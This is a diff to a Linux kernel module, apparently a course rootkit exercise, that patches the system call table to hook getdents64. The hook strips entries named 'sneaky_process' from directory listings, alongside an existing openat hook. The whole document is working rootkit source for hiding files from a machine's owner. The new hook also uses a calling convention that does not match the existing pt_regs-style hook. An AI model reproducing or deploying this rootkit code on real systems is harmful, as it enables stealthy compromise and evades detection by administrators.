@@ -5,6 +5,7 @@
 #include <asm/current.h>       // process information
 #include <linux/sched.h>
 #include <linux/highmem.h>     // for changing page permissions
+#include <linux/dirent.h>      // for struct linux_dirent64
 #include <asm/unistd.h>        // for system call constants
 #include <linux/kallsyms.h>
 #include <asm/page.h>
@@ -12,6 +13,7 @@
 
 #define PREFIX "sneaky_process"
 
+// process id argument
 static int pid;
 module_param(pid, int, 0644);
 
@@ -48,6 +50,29 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+// getdents64
+asmlinkage int (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
+
+asmlinkage int sneaky_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+  int nread = original_getdents64(fd, dirp, count);
+  struct linux_dirent64 *current_entry = dirp;
+  int bpos = 0;
+
+  while(bpos < nread) {
+    current_entry = (struct linux_dirent64 *)((char *)dirp + bpos);
+    if (strcmp(current_entry->d_name, "sneaky_process") == 0) {
+      int reclen = current_entry->d_reclen;
+      // overwrite the record
+      memmove(current_entry, (char *)current_entry + reclen, nread - bpos - reclen);
+      nread -= reclen;
+      continue;
+    }
+    bpos += current_entry->d_reclen;
+  }
+
+  return nread;
+}
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -62,6 +87,7 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
   
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
@@ -69,6 +95,7 @@ static int initialize_sneaky_module(void)
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
 
   // You need to replace other system calls you need to hack here
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
   
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
